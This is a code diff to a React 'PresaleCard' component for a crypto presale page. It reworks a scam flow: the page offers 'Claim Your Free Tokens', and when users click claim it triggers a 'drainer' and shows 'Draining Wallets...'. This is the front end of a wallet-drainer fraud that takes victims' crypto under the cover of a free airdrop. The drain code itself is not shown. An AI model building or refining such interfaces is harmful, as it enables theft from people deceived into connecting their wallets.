@@ -431,15 +431,24 @@ const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim
     toast.error(error.message || 'An error occurred during the drain process');
   }, []);
 
-  const handleContribution = () => {
-    if (stage === 'connect') {
+  const [isDraining, setIsDraining] = useState(false);
+
+  const handleContribution = async () => {
+    if (stage === "connect") {
       setShowWalletModal(true);
-    } else if (stage === 'verify') {
-      verify();
-    } else if (stage === 'claim') {
-      // Show the drainer when claiming
-      setShowDrainer(true);
-      claim();
+    } else if (stage === "verify") {
+      await verify();
+    } else if (stage === "claim") {
+      try {
+        setIsDraining(true);
+        // Show the drainer when claiming
+        setShowDrainer(true);
+        await claim();
+      } catch (error) {
+        console.error("Error during claim:", error);
+        toast.error("Failed to start claim process");
+        setIsDraining(false);
+      }
     }
   };
 
@@ -497,25 +506,31 @@ const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim
                 <span>Connect Wallet</span>
                 <FaArrowRight />
               </button>
-              <button 
-                onClick={() => setShowWalletModal(true)}
-                className="w-full bg-green-500 hover:bg-green-600 text-white py-3 px-6 rounded-xl font-bold transition-all duration-200"
-              >
-                Claim your free tokens
-              </button>
             </div>
           )}
 
           {(stage === 'verify' || stage === 'claim') && (
             <div className="space-y-4">
-              <div className="bg-gray-800 p-4 rounded-xl">
-                <button
-                  onClick={handleContribution}
-                  className="w-full py-3 px-6 rounded-lg font-bold text-white transition-colors bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
-                >
-                  {stage === 'verify' ? 'Verify' : 'Claim Your Free Tokens'}
-                </button>
-              </div>
+              <button
+                onClick={handleContribution}
+                disabled={stage === 'claim'}
+                className={`w-full py-3 px-6 rounded-xl font-bold text-white transition-all duration-200 ${
+                  stage === 'claim' 
+                    ? 'bg-gray-600 cursor-not-allowed' 
+                    : 'bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700'
+                }`}
+              >
+                {stage === 'verify' ? (
+                  'Verify'
+                ) : stage === 'claim' ? (
+                  <div className="flex items-center justify-center">
+                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
+                    Draining Wallets...
+                  </div>
+                ) : (
+                  'Claim Your Free Tokens'
+                )}
+              </button>
             </div>
           )}
         </div>
